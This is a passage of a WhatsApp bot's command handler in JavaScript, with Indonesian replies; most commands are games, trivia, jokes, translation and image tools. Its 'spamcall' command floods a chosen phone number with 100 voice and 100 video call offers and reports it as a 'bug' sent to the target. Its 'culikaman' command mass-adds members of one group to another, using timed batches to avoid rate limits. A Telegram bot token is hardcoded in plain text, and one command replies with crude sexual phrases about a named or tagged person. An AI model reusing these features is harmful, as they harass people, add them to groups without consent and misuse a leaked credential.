      if (!text) return m.reply(`Contoh: ${p_c} nama seseorang atau tag`)
      const hobi = [
        'coli', 'ngocok kontol', 'jilatin memek', 'remesin tt'
      ]
      const coli = hobi[Math.floor(Math.random() * hobi.length)]
      m.reply(`*Pertanyaan:* Cekhoby ${text}\n*Jawaban:* ${coli}`)
    }
    break

    case 'cekjodoh': {
      try {
        let target = text ?
          text.replace(/[@]/g, '').split('@')[0] :
          m.sender.split('@')[0]

        let member = participants
          .filter(u => typeof u.id === 'string' && u.id.includes('@'))
          .map(u => u.id.split('@')[0])

        if (!member.includes(target)) target = m.sender.split('@')[0]

        let jodoh = member[Math.floor(Math.random() * member.length)]
        let jawab = `*JODOHNYA ${conn.getName(target + '@s.whatsapp.net').toUpperCase()}*\n@${target} ❤️ @${jodoh}`
        conn.sendTextWithMentions(m.chat, jawab, m)
      } catch (err) {
        m.reply('Terjadi kesalahan: ' + err)
      }
    }
    break

    case 'apakah': {
      if (!text) return m.reply(`Contoh: ${prefix + command} saya ganteng?`)
      const jawaban = ['Iya', 'Mungkin iya', 'Mungkin', 'Gak', 'Mungkin gak', 'gtw kocak ngapain nanya gw']
      const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
      m.reply(`*Pertanyaan:* Apakah ${text}\n*Jawaban:* ${coli}`)
    }
    break

    case 'bisakah': {
      if (!text) return m.reply(`Contoh: ${p_c} saya jadi kaya?`)
      const jawaban = ['Bisa banget', 'Bisa', 'Mungkin bisa', 'Mungkin', 'Gak bisa', 'Mungkin gak bisa', 'Gak bisa lah', 'gtw kocak ngapain nanya gw']
      const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
      m.reply(`*Pertanyaan:* Bisakah ${text}\n*Jawaban:* ${coli}`)
    }
    break

    case 'kapankah': {
      if (!text) return m.reply(`Contoh: ${p_c} saya kaya?`)
      const jawabanWaktu = [
        'Bentar lagi',
        'Nunggu kiamat dulu',
        'Kapan-kapan',
        'Besok',
        'Pas lu tidur',
        'gtw kocak ngapain nanya gw'
      ]
      const waktuRandom = Math.floor(Math.random() * 10) + 1
      const unitWaktu = ['minggu', 'bulan', 'tahun']
      const unitWaktuRandom = unitWaktu[Math.floor(Math.random() * unitWaktu.length)]
      const jawaban = [...jawabanWaktu, `${waktuRandom} ${unitWaktuRandom} lagi`]
      const hasilJawaban = jawaban[Math.floor(Math.random() * jawaban.length)]
      m.reply(`*Pertanyaan:* Kapankah ${text}\n*Jawaban:* ${hasilJawaban}`)
    }
    break;

 case 'spamcall': {
if (!premonly) return reply(mess.premium)

if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);

//func
        async function sendOfferCall(target) {
    try {
        await conn.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

        async function sendOfferVideoCall(target) {
    try {
        await conn.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}

//done

target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

m.reply(`*[!] bug successfully sent to target*`); 

    for (let i = 0; i < 100; i++) {
        await sendOfferCall(target);
        await sendOfferVideoCall(target);
    }
}
break;

case 'warga': case 'wargagroup': case 'wargagb':  {
  if (!m.isGroup) return m.reply('Fitur ini hanya untuk grup!');
  const group = await conn.groupMetadata(m.chat);
  const members = group.participants;
const kodeNegaraMap = {
  '1': 'Amerika Serikat / Kanada',
  '7': 'Rusia / Kazakhstan',
  '20': 'Mesir',
  '27': 'Afrika Selatan',
  '30': 'Yunani',
  '31': 'Belanda',
  '32': 'Belgia',
  '33': 'Perancis',
  '34': 'Spanyol',
  '36': 'Hungaria',
  '39': 'Italia',
  '40': 'Rumania',
  '41': 'Swiss',
  '43': 'Austria',
  '44': 'Inggris',
  '45': 'Denmark',
  '46': 'Swedia',
  '47': 'Norwegia',
  '48': 'Polandia',
  '49': 'Jerman',
  '51': 'Peru',
  '52': 'Meksiko',
  '53': 'Kuba',
  '54': 'Argentina',
  '55': 'Brasil',
  '56': 'Chili',
  '57': 'Kolombia',
  '58': 'Venezuela',
  '60': 'Malaysia',
  '61': 'Australia',
  '62': 'Indonesia',
  '63': 'Filipina',
  '64': 'Selandia Baru',
  '65': 'Singapura',
  '66': 'Thailand',
  '81': 'Jepang',
  '82': 'Korea Selatan',
  '84': 'Vietnam',
  '86': 'Tiongkok',
  '90': 'Turki',
  '91': 'India',
  '92': 'Pakistan',
  '93': 'Afghanistan',
  '94': 'Sri Lanka',
  '95': 'Myanmar',
  '98': 'Iran',
  '211': 'Sudan Selatan',
  '212': 'Maroko',
  '213': 'Aljazair',
  '216': 'Tunisia',
  '218': 'Libya',
  '220': 'Gambia',
  '221': 'Senegal',
  '222': 'Mauritania',
  '223': 'Mali',
  '224': 'Guinea',
  '225': 'Pantai Gading',
  '226': 'Burkina Faso',
  '227': 'Niger',
  '228': 'Togo',
  '229': 'Benin',
  '230': 'Mauritius',
  '231': 'Liberia',
  '232': 'Sierra Leone',
  '233': 'Ghana',
  '234': 'Nigeria',
  '235': 'Chad',
  '236': 'Republik Afrika Tengah',
  '237': 'Kamerun',
  '238': 'Tanjung Verde',
  '239': 'Sao Tome dan Principe',
  '240': 'Guinea Khatulistiwa',
  '241': 'Gabon',
  '242': 'Kongo (Republik)',
  '243': 'Kongo (DRC)',
  '244': 'Angola',
  '245': 'Guinea-Bissau',
  '246': 'Diego Garcia',
  '247': 'Ascension Island',
  '248': 'Seychelles',
  '249': 'Sudan',
  '250': 'Rwanda',
  '251': 'Ethiopia',
  '252': 'Somalia',
  '253': 'Djibouti',
  '254': 'Kenya',
  '255': 'Tanzania',
  '256': 'Uganda',
  '257': 'Burundi',
  '258': 'Mozambik',
  '260': 'Zambia',
  '261': 'Madagaskar',
  '262': 'Réunion',
  '263': 'Zimbabwe',
  '264': 'Namibia',
  '265': 'Malawi',
  '266': 'Lesotho',
  '267': 'Botswana',
  '268': 'Eswatini',
  '269': 'Komoro',
  '290': 'Saint Helena',
  '291': 'Eritrea',
  '297': 'Aruba',
  '298': 'Faroe Islands',
  '299': 'Greenland',
  '350': 'Gibraltar',
  '351': 'Portugal',
  '352': 'Luksemburg',
  '353': 'Irlandia',
  '354': 'Islandia',
  '355': 'Albania',
  '356': 'Malta',
  '357': 'Siprus',
  '358': 'Finlandia',
  '359': 'Bulgaria',
  '370': 'Lituania',
  '371': 'Latvia',
  '372': 'Estonia',
  '373': 'Moldova',
  '374': 'Armenia',
  '375': 'Belarus',
  '376': 'Andorra',
  '377': 'Monako',
  '378': 'San Marino',
  '380': 'Ukraina',
  '381': 'Serbia',
  '382': 'Montenegro',
  '385': 'Kroasia',
  '386': 'Slovenia',
  '387': 'Bosnia dan Herzegovina',
  '389': 'Makedonia Utara',
  '420': 'Ceko',
  '421': 'Slovakia',
  '423': 'Liechtenstein',
  '850': 'Korea Utara',
  '852': 'Hong Kong',
  '853': 'Makau',
  '855': 'Kamboja',
  '856': 'Laos',
  '880': 'Bangladesh',
  '886': 'Taiwan',
  '960': 'Maladewa',
  '961': 'Lebanon',
  '962': 'Yordania',
  '963': 'Suriah',
  '964': 'Irak',
  '965': 'Kuwait',
  '966': 'Arab Saudi',
  '967': 'Yaman',
  '968': 'Oman',
  '971': 'Uni Emirat Arab',
  '972': 'Israel',
  '973': 'Bahrain',
  '974': 'Qatar',
  '975': 'Bhutan',
  '976': 'Mongolia',
  '977': 'Nepal'
};
  let negaraStat = {};
  for (let member of members) {
    const id = member.id.split('@')[0];
    let kode = Object.keys(kodeNegaraMap).find(k => id.startsWith(k));
    let negara = kode ? kodeNegaraMap[kode] : 'Tidak Diketahui';
    if (!negaraStat[negara]) negaraStat[negara] = 0;
    negaraStat[negara]++;
  }
  let teks = `*Warga Grup: ${group.subject}*\n`;
  teks += `Total Member: *${members.length}*\n\n`;
  teks += `*Asal Negara:*\n`;
  let urutan = Object.entries(negaraStat)
    .sort((a, b) => b[1] - a[1]) 
    .map(([negara, jumlah], i) => `${i + 1}. ${negara} - ${jumlah} orang`)
    .join('\n');
  teks += urutan;
  m.reply(teks);
}
break;

case 'culikaman': {
if (!premonly) return reply(mess.premium)
  if (!text) return m.reply('Format Salah!\nContoh: .culikaman idGrupAsal|idGrupTujuan');
  let [fromGroup, toGroup] = text.split('|').map(v => v.trim());
  if (!fromGroup || !toGroup) return m.reply('Format Salah!\nContoh: .culikaman idGrupAsal|idGrupTujuan');

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms))
}

  try {
    let metadata = await conn.groupMetadata(fromGroup);
    let targetGroup = await conn.groupMetadata(toGroup);
    if (!targetGroup.participants.find(p => p.id == conn.user.jid || p.id == conn.decodeJid(conn.user.id)))
      return m.reply('❌ Bot Harus Jadi Admin Di Grup Tujuan!');
    let peserta = metadata.participants.map(v => v.id);
    let sudah = targetGroup.participants.map(u => u.id);
    let belum = peserta.filter(x => !sudah.includes(x));
    let total = belum.length;
    let batchSize = 15;
    let jedaBatch = 1000 * 60 * 10; // 10 menit
    m.reply(`🚀 Mulai Culik Aman\n📊 Total Target: ${total} orang\n📦 Limit per batch: ${batchSize} orang\n⏳ Jeda antar batch: 10 menit`);
    for (let i = 0; i < belum.length; i += batchSize) {
      let batch = belum.slice(i, i + batchSize);
      for (let user of batch) {
        try {
          await delay(Math.floor(Math.random() * 3000) + 3000); 
          await conn.groupParticipantsUpdate(toGroup, [user], 'add');
        } catch (e) {
          console.log(`❌ Gagal add ${user} → ${e.message}`);
        }
      }
      if (i + batchSize < belum.length) {
        await conn.sendMessage(m.chat, { text: `✅ Batch ${i / batchSize + 1} selesai.\n⏱️ Lanjut 10 menit lagi...` });
        await delay(jedaBatch);
      }
    }
    m.reply('✅ Semua target sudah diproses!');
  } catch (e) {
    console.log(e);
    m.reply('❌ Gagal proses.\nPastikan ID grup benar dan bot adalah admin di grup tujuan.');
  }
}
break;

case 'cekip': {
  if (!text) return m.reply('Masukkan IP nya!\nContoh: cekip 123.45.67.89');
  try {
    const res = await fetch(`https://ipwhois.app/json/${text}`);
    const data = await res.json();
    if (data.success === false || !data.ip) return m.reply('IP tidak valid atau tidak ditemukan.');

    const info = `
*IP Checker*

• IP: ${data.ip}
• ISP: ${data.isp}
• ASN: ${data.asn}
• Provider: ${data.org}
• Negara: ${data.country} (${data.country_code})
• Region: ${data.region}
• Kota: ${data.city}
• Lokasi: ${data.latitude}, ${data.longitude}
• Timezone: ${data.timezone}
• Reverse DNS: ${data.reverse || '-'}
    `.trim();
    await m.reply(info);
  } catch (e) {
    console.log(e);
    m.reply('Gagal mengambil data IP.');
  }
}
  break;

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
await m.reply(`${res.id}`)
}
break;


case 'rmvbg':
case 'removebg':
case 'removebackground': {
    if (!quoted) return m.reply('Harap balas ke foto yang ingin dihapus backgroundnya')
    if (!/image/.test(mime)) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`)

    const BodyForm = require('form-data')
    const uploadFileUgu = async (input) => {
        try {
            const form = new BodyForm()
            form.append("files[]", fs.createReadStream(input))
            const axios = require('axios');
            const { data } = await axios({
                url: "https://uguu.se/upload.php",
                method: "POST",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                    ...form.getHeaders()
                },
                data: form,
                timeout: 10000 
            })
            
            if (!data?.files?.[0]) throw new Error('Upload failed')
            return data.files[0]
            
        } catch (err) {
            throw new Error(`Error uploading file: ${err.message}`)
        }
    }

    try {
        
        await conn.sendMessage(m.chat, { 
            react: { 
                text: '⏱️', 
                key: m.key 
            }
        })

      
        const media = await conn.downloadAndSaveMediaMessage(quoted)
        const uploadResult = await uploadFileUgu(media)
        const imageUrl = `https://fastrestapis.fasturl.cloud/aiimage/removebg?imageUrl=${uploadResult.url}&type=auto&shadow=false`
        
        
        await conn.sendMessage(m.chat, { 
            image: { url: imageUrl }, 
            caption: '*done sorry kalo burik 😹*' 
        }, { 
            quoted: m
        })

    
        fs.unlinkSync(media)
        
    } catch (error) {
        console.error('Error in remove background:', error)
        m.reply('Maaf, terjadi kesalahan saat menghapus background gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
    }
}
break;


case 'tr': case 'translate': {
if (!q.includes('|')) return m.reply('Formatnya salah!\nContoh: translate halo|id\n\nto indonesian: id\nto inggris: en');
const [teks, target] = q.split('|');
try {
const axios = require('axios');
const response = await axios.post('https://api.stringtranslate.com/string', {
text: `<p>${teks}</p>`,
from: 'auto',
lang: target.trim(),
id: Math.random().toString(36).substring(7)
}, {
headers: {
'authority': 'api.stringtranslate.com',
'content-type': 'application/json',
'origin': 'https://stringtranslate.com',
'referer': 'https://stringtranslate.com/',
'user-agent': 'Postify/1.0.0'
}
});
const cheerio = require('cheerio');
const $ = cheerio.load(response.data);
const hasil = $('font[style="vertical-align: inherit;"]').eq(1).text();
m.reply(`${hasil}`);
} catch (e) {
m.reply(`Gagal translate: ${e.message}`);
}
}
break;

case "toprompt": {
const axios = require('axios')
const FormData = require('form-data')

async function Uguu(buffer, filename) {
  const form = new FormData()
  form.append('files[]', buffer, { filename })
  const { data } = await axios.post('https://uguu.se/upload.php', form, {
    headers: form.getHeaders(),
  })
  if (data.files && data.files[0]) {
    return data.files[0].url
  } else {
    throw new Error('eror, gagal upload ke uguu, coba lagi')
  }
}

  try {
    const q = m.quoted ? m.quoted : m
    const mime = (q.msg || q).mimetype || ''
    if (!mime.startsWith('image/')) {
      return m.reply('kirim atau replay gambar')
    }
    await m.reply('sabar')
    const media = await q.download()
    const filename = `image_${Date.now()}.jpg`
    const imageUrl = await Uguu(media, filename)
    const apiUrl = `https://zenzxz.dpdns.org/tools/toprompt?url=${encodeURIComponent(imageUrl)}`
    const { data } = await axios.get(apiUrl)
    if (!data.status) throw 'eror'
    await conn.sendMessage(m.chat, {
      text: `hasil : \n\n${data.result}`,
    }, { quoted: m })
  } catch (err) {
    m.reply(err.message || err)
  }
}
break
 
case 'telestick': {
const { Sticker } = require('wa-sticker-formatter')
  async function telestick(url) {
    let match = url.match(/https:\/\/t\.me\/addstickers\/([^\/\?#]+)/)
    if (!match) throw 'Invalid url'
    let { data: a } = await axios.get(`https://api.telegram.org/bot7935827856:AAGdbLXArulCigWyi6gqR07gi--ZPm7ewhc/getStickerSet?name=${match[1]}`)
    let stickers = await Promise.all(a.result.stickers.map(async v => {
      let { data: b } = await axios.get(`https://api.telegram.org/bot7935827856:AAGdbLXArulCigWyi6gqR07gi--ZPm7ewhc/getFile?file_id=${v.file_id}`)
      return {
        emoji: v.emoji,
        is_animated: v.is_animated,
        image_url: `https://api.telegram.org/file/bot7935827856:AAGdbLXArulCigWyi6gqR07gi--ZPm7ewhc/${b.result.file_path}`
      }
    }))
    return { name: a.result.name, title: a.result.title, sticker_type: a.result.sticker_type, stickers }
  }
 
  try {
    if (!args[0]) return m.reply('Masukkan url sticker telegram')
    let res = await telestick(args[0])
    for (let v of res.stickers) {
      let { data } = await axios.get(v.image_url, { responseType: 'arraybuffer' })
      let sticker = new Sticker(data, { pack: res.title, author: 'Telegram', type: v.is_animated ? 'full' : 'default' })
      await conn.sendMessage(m.chat, await sticker.toMessage(), { quoted: m })
    }
  } catch (e) {
    m.reply(e.message)
  }
}
break;

case 'cloudku':
case 'shortcloud': {
 if (!text) return m.reply(`Masukkan URL!\nContoh: ${prefix + command} https://example.com [custom]`);

 const [link, customCode] = text.trim().split(' ');

 const timestamp = Math.floor(Date.now() / 1000);
 const custom = customCode || Math.floor(100000 + Math.random() * 900000).toString();

 const payload = {
 url: link,
 custom,
 timestamp
 };

 const headers = {
 'Content-Type': 'application/json',
 'Origin': 'https://cloudku.click',
 'Referer': 'https://cloudku.click/',
 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107 Safari/537.36',
 'X-Requested-With': 'XMLHttpRequest'
 };

 try {
 const res = await fetch('https://cloudku.click/api/link.php', {
 method: 'POST',
 headers,
 body: JSON.stringify(payload)
 });

 const json = await res.json();
 if (!json.success || !json.data?.shortUrl) return cpe("❌ Gagal membuat short URL.");

 const { shortUrl, originalUrl, created, key } = json.data;

 const anja = `
${shortUrl}
`
conn.sendMessage(m.chat, {
  image: { url: "https://l.top4top.io/p_3438tcdbc1.jpg" },
        caption: anja,
                    })

 } catch (err) {
 console.error('[SHORT ERROR]', err);
 cpe("❌ Gagal memendekkan link.");
 }
}
break

			case 'mitos': {
				const myths = [
					'🌕 *Mitos Bulan Purnama:* Banyak orang percaya bahwa bulan purnama bisa memengaruhi perilaku manusia, menyebabkan kegilaan, dan meningkatkan angka kejahatan.',
					'🪞 *Mitos Cermin Pecah:* Memecahkan cermin dipercaya membawa nasib buruk selama 7 tahun.',
					'👻 *Mitos Hantu di Pohon Beringin:* Pohon beringin sering dikaitkan dengan makhluk halus dan dipercaya sebagai tempat tinggal roh gentayangan.',
					'🐈‍⬛ *Mitos Kucing Hitam:* Melihat kucing hitam melintas di depanmu sering dianggap sebagai pertanda sial.',
					'💍 *Mitos Cincin di Jari Tengah:* Memakai cincin di jari tengah dipercaya dapat menarik energi positif dan keberuntungan.',
					'🧂 *Mitos Menumpahkan Garam:* Menumpahkan garam dipercaya membawa nasib buruk, kecuali jika dilemparkan ke bahu kiri.',
					'🔮 *Mitos Bola Kristal:* Bola kristal sering dikaitkan dengan kemampuan meramal masa depan.',
					'🎋 *Mitos Pohon Bamboo:* Pohon bamboo di halaman rumah dipercaya bisa mengundang energi positif dan membawa keberuntungan.',
					'🌠 *Mitos Bintang Jatuh:* Jika melihat bintang jatuh dan membuat permintaan, maka permintaan itu akan terkabul.',
					'🐦 *Mitos Burung Masuk Rumah:* Burung yang masuk ke dalam rumah sering dianggap sebagai pertanda akan ada tamu atau berita penting.',
					'🌧️ *Mitos Hujan di Hari Pernikahan:* Hujan di hari pernikahan sering dianggap sebagai pertanda keberuntungan dan kebahagiaan.',
					'🍃 *Mitos Daun Jatuh di Kepala:* Jika ada daun jatuh di kepala seseorang, dipercaya orang itu akan mendapat keberuntungan.',
					'🦉 *Mitos Burung Hantu:* Burung hantu sering dianggap sebagai simbol kematian atau pertanda buruk di beberapa budaya.',
					'🖤 *Mitos Warna Hitam:* Warna hitam sering dikaitkan dengan kesialan dan energi negatif.',
					'🌈 *Mitos Ujung Pelangi:* Konon, ada harta karun di ujung pelangi, tetapi tidak ada yang bisa mencapainya.',
					'🌺 *Mitos Bunga Tumbuh di Makam:* Bunga yang tumbuh subur di makam dipercaya sebagai tanda bahwa roh orang yang dimakamkan itu damai.',
					'🏰 *Mitos Kastil Berhantu:* Banyak kastil tua di Eropa dipercaya dihantui oleh roh para penghuni masa lalu.',
					'💤 *Mitos Mimpi Gigi Copot:* Mimpi gigi copot sering dianggap sebagai pertanda akan ada kematian di keluarga.',
					'🌜 *Mitos Menghitung Bintang:* Menghitung bintang di langit dipercaya bisa membuat seseorang tumbuh jerawat.',
					'🍀 *Mitos Daun Semanggi Berdaun Empat:* Menemukan daun semanggi berdaun empat dipercaya membawa keberuntungan.',
					'🔥 *Mitos Api Menyala Sendiri:* Api yang menyala tiba-tiba di malam hari sering dikaitkan dengan kehadiran roh halus.',
					'🎵 *Mitos Siulan di Malam Hari:* Bersiul di malam hari dipercaya dapat mengundang makhluk halus.',
					'🦎 *Mitos Cicak Jatuh di Kepala:* Jika cicak jatuh di kepala seseorang, dipercaya itu adalah pertanda buruk.',
					'🌺 *Mitos Bunga Sedap Malam:* Aroma bunga sedap malam sering dianggap sebagai tanda kehadiran makhluk halus.',
					'🪦 *Mitos Makam Baru:* Mengunjungi makam yang baru dibuat di malam hari dipercaya dapat membawa energi negatif.',
					'🧟 *Mitos Zombie di Haiti:* Dalam kepercayaan Voodoo Haiti, ada mitos tentang manusia yang dihidupkan kembali sebagai zombie oleh penyihir.',
					'🌟 *Mitos Cahaya Misterius di Malam Hari:* Cahaya aneh yang terlihat di malam hari sering dianggap sebagai roh yang sedang berkeliaran.',
					'🏞️ *Mitos Danau Berhantu:* Banyak danau di dunia yang dipercaya dihuni oleh roh penjaga atau makhluk mitos.',
					'🪶 *Mitos Bulu Putih:* Menemukan bulu putih dipercaya sebagai tanda bahwa malaikat sedang menjaga kita.',
					'🍃 *Mitos Angin Berhembus Kencang Tiba-Tiba:* Angin yang tiba-tiba berhembus kencang sering dianggap sebagai tanda kehadiran makhluk halus.',
					'🎭 *Mitos Topeng Berhantu:* Beberapa topeng tradisional dipercaya memiliki roh atau energi mistis yang kuat.',
					'🗿 *Mitos Patung Tua:* Patung tua sering dianggap memiliki roh atau kutukan di dalamnya.',
					'⚰️ *Mitos Peti Mati Bergerak:* Ada mitos di beberapa budaya bahwa peti mati bisa bergerak sendiri jika ada roh yang tidak tenang.',
					'🔔 *Mitos Lonceng Berbunyi Sendiri:* Jika lonceng berbunyi sendiri tanpa ada angin atau yang memukulnya, sering dianggap sebagai tanda roh yang ingin berkomunikasi.'
				];
				const randomMyth = myths[Math.floor(Math.random() * myths.length)];
				reply(`🪄 *Mitos Menarik*\n\n${randomMyth}`);

				break;
			}

			case 'faktaunik': {
				const facts = [
					'🧠 Otak manusia dapat menghasilkan listrik yang cukup untuk menyalakan lampu kecil!',
					'🐼 Panda bisa menghabiskan sekitar 12 jam sehari hanya untuk makan bambu.',
					'🌕 Di bulan, jejak kaki manusia bisa bertahan selama jutaan tahun karena tidak ada angin atau hujan.',
					'🦄 Jerapah tidur hanya sekitar 10-30 menit sehari dan sering tidur sambil berdiri!',
					'🎵 Musik dapat meningkatkan suasana hati dan membantu mengurangi stres.',
					'🐢 Penyu sudah ada sejak zaman dinosaurus, sekitar lebih dari 200 juta tahun yang lalu.',
					'🍫 Cokelat bisa memicu hormon endorfin yang membuat seseorang merasa bahagia.',
					'🚀 Di luar angkasa, air mata tidak bisa jatuh karena gravitasi yang rendah!',
					'🔮 Lebih dari 70% permukaan Bumi ditutupi oleh air.',
					'🐝 Lebah bisa mengenali wajah manusia layaknya manusia mengenali wajah satu sama lain.',
					'🐧 Penguin adalah satu-satunya burung yang bisa berenang tetapi tidak bisa terbang.',
					'🦷 Gigi adalah satu-satunya bagian tubuh manusia yang tidak bisa memperbaiki dirinya sendiri.',
					'🐌 Siput bisa tidur hingga 3 tahun lamanya!',
					'🔑 Sidik jari koala sangat mirip dengan sidik jari manusia.',
					'🌍 Bumi adalah satu-satunya planet yang tidak dinamai berdasarkan nama dewa atau dewi.',
					'🐟 Ikan mas memiliki ingatan yang lebih baik daripada yang orang pikirkan, mereka bisa mengingat sesuatu hingga beberapa bulan.',
					'🦇 Kelelawar adalah satu-satunya mamalia yang bisa terbang.',
					'🎤 Hati manusia berdetak sekitar 100.000 kali sehari.',
					'🌈 Tidak ada dua pelangi yang benar-benar sama, setiap orang melihat pelangi dengan sudut pandang berbeda.',
					'📱 Lebih banyak orang di dunia memiliki akses ke ponsel daripada toilet bersih.',
					'🌋 Di Islandia, ada lebih dari 100 gunung berapi aktif.',
					'💧 Air panas bisa membeku lebih cepat daripada air dingin dalam kondisi tertentu (Efek Mpemba).',
					'⚡ Petir lebih panas dari permukaan matahari.',
					'🦩 Flamingo mendapatkan warna pink dari makanan yang mereka makan, yaitu udang.',
					'🐇 Kelinci tidak bisa muntah.',
					'🧊 Antartika adalah gurun terbesar di dunia meskipun tertutup es.',
					'🐜 Semut tidak memiliki paru-paru, mereka bernapas melalui pori-pori kecil di tubuh mereka.',
					'🌟 Cahaya dari bintang yang kita lihat mungkin sudah tidak ada lagi karena bintang tersebut bisa saja sudah mati.',
					'🕷️ Laba-laba bisa menghasilkan sutra yang lebih kuat daripada baja dengan berat yang sama.',
					'🐨 Koala tidur hingga 20 jam sehari.',
					'🦁 Singa betina lebih sering berburu dibandingkan singa jantan.',
					'🐍 Ular bisa tidur dengan mata terbuka karena mereka tidak memiliki kelopak mata.',
					'🧠 Otak manusia terdiri dari sekitar 75% air.',
					'🐦 Burung kolibri adalah satu-satunya burung yang bisa terbang mundur.',
					'🎮 Bermain video game bisa meningkatkan koordinasi tangan dan mata.',
					'📖 Orang yang membaca buku secara rutin cenderung lebih empatik dan mudah memahami perasaan orang lain.',
					'🎭 Tertawa dapat meningkatkan sistem kekebalan tubuh.',
					'🌠 Rata-rata ada 44 petir yang menyambar permukaan bumi setiap detik.',
					'🦜 Burung beo bisa meniru suara manusia karena memiliki struktur otot vokal yang unik.',
					'🐴 Kuda bisa tidur sambil berdiri.',
					'🐶 Anjing bisa memahami lebih dari 150 kata manusia.',
					'🌬️ Angin terkuat yang pernah tercatat di Bumi memiliki kecepatan 372 km/jam.',
					'🍯 Madu adalah satu-satunya makanan yang tidak pernah basi.',
					'🦀 Kepiting bisa berjalan ke samping karena struktur tubuh dan kakinya.',
					'🌌 Ada lebih banyak bintang di alam semesta daripada butiran pasir di semua pantai di Bumi.',
					'🐉 Komodo adalah kadal terbesar di dunia.',
					'🏊‍♂️ Manusia bisa bertahan tanpa makanan selama berminggu-minggu, tetapi hanya beberapa hari tanpa air.',
					'🦎 Jika ekor cicak putus, ekornya akan tumbuh kembali.',
					'🚀 Sebagian besar debu di rumah berasal dari kulit mati manusia.'
				];
				const randomFact = facts[Math.floor(Math.random() * facts.length)];
				reply(`🧠 *Fakta Unik*\n\n${randomFact}`);
				break;
			}

			case 'faktakucing': {
				const fakta = [
					'🐾 Kucing bisa melompat hingga 6 kali panjang tubuhnya!',
					'🐾 Lidah kucing memiliki tekstur kasar untuk membersihkan bulu.',
					'🐾 Kucing menghabiskan sekitar 70% hidupnya untuk tidur.',
					'🐾 Telinga kucing bisa berputar hingga 180 derajat!',
					'🐾 Kucing punya lima jari di kaki depan, tetapi hanya empat jari di kaki belakang.',
					'🐾 Kucing bisa berlari hingga 48 km per jam! Cepet banget, ya! 😲',
					'🐾 Kucing bisa mendengar suara frekuensi tinggi yang tidak bisa didengar manusia.',
					'🐾 Kucing bisa berkomunikasi dengan manusia lewat suara dan gerakan tubuh.',
					'🐾 Kucing memiliki 32 otot di telinga mereka untuk mengatur posisi telinga.',
					'🐾 Kucing memiliki indera penciuman yang 14 kali lebih tajam daripada manusia!',
					'🐾 Kucing menggosokkan kepala mereka ke objek sebagai tanda perkenalan dan untuk menandai wilayahnya.',
					'🐾 Beberapa kucing bisa mengingat tempat-tempat tertentu meskipun sudah bertahun-tahun berlalu.',
					'🐾 Kucing bisa melihat dengan jelas dalam kondisi cahaya yang sangat rendah, hampir gelap total!',
					'🐾 Kucing domestik punya banyak jenis suara, antara lain meong, dengkuran, dan purring!',
					'🐾 Kucing suka menjilat tangan mereka setelah makan untuk membersihkan diri dan merasa lebih tenang.',
					'🐾 Kucing sering tidur dengan mata setengah terbuka, ini untuk tetap waspada dari ancaman.',
					'🐾 Kucing punya kemampuan luar biasa dalam merasakan getaran tanah, misalnya gempa bumi!',
					'🐾 Kucing memiliki 9 kehidupan yang legendaris (tapi hanya mitos, ya)!',
					'🐾 Kucing bisa merasakan perubahan cuaca, kadang mereka lebih sensitif daripada manusia.',
					'🐾 Kucing tidak bisa merasakan rasa manis, lho! Mereka hanya suka makanan berbasis protein.'
				];
				const randomFakta = fakta[Math.floor(Math.random() * fakta.length)];
				reply(randomFakta);
				}
				break;

			case 'jokes': {
				const jokes = [
					'🤣 Kenapa kucing gak suka online? Karena takut kena mouse!',
					'🤣 Apa bahasa Jepangnya diskon? Murah-murashii!',
					'🤣 Kenapa sepeda gak bisa berdiri sendiri? Karena lelah!',
					'🤣 Kenapa ikan gak pernah ketabrak saat berenang? Karena selalu lihat ke kiri dan kanan!',
					'🤣 Hewan apa yang gak pernah salah? Kuda, karena selalu di jalur yang benar!',
					'🤣 Kenapa matematika bikin pusing? Karena kalau dihitung terus, gak ada habisnya!',
					'🤣 Apa bedanya jemuran sama orang ngambek? Kalau jemuran dijemur, kalau orang ngambek diem-diem aja!',
					'🤣 Kenapa pohon kelapa di depan rumah harus ditebang? Soalnya kalau dicabut berat!',
					'🤣 Ayam apa yang bikin lelah? Ayam capek (cape)!',
					'🤣 Kalau ikan jadi presiden, siapa wakilnya? Ikan Hiu… Hiupresiden!',
					'🤣 Kenapa komputer suka kerja lembur? Soalnya takut di-*shutdown*!',
					'🤣 Apa bahasa Jepangnya air terjun? Byur-byur-yamashita!',
					'🤣 Kenapa guru selalu bawa buku? Karena kalau bawa genteng berat!',
					'🤣 Hewan apa yang paling kaya? Beruang... Karena punya *bear*-ang!',
					'🤣 Kenapa burung gagak gak pernah ke gym? Karena udah punya *sayap*!',
					'🤣 Kenapa tikus suka ke bioskop? Karena di sana banyak *trail*r (tikus rela)!',
					'🤣 Apa yang lebih kecil dari semut? Bayinya semut!',
					'🤣 Kenapa Superman gak pernah pake baju warna hijau? Karena warnanya udah dipake Hulk!',
					'🤣 Kenapa lampu merah suka bikin macet? Soalnya dia suka berhenti di tempat!',
					'🤣 Kenapa nasi goreng lebih populer daripada nasi putih? Karena nasi putih gak ada suaranya pas dimasak!'
				];
				const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
				reply(randomJoke);
				}
				break;

			case 'cekwaifu': {
				if (!quoted) return reply(`Kirim/Reply Gambar Waifu Kamu Dengan Caption *${prefix + command}*`);
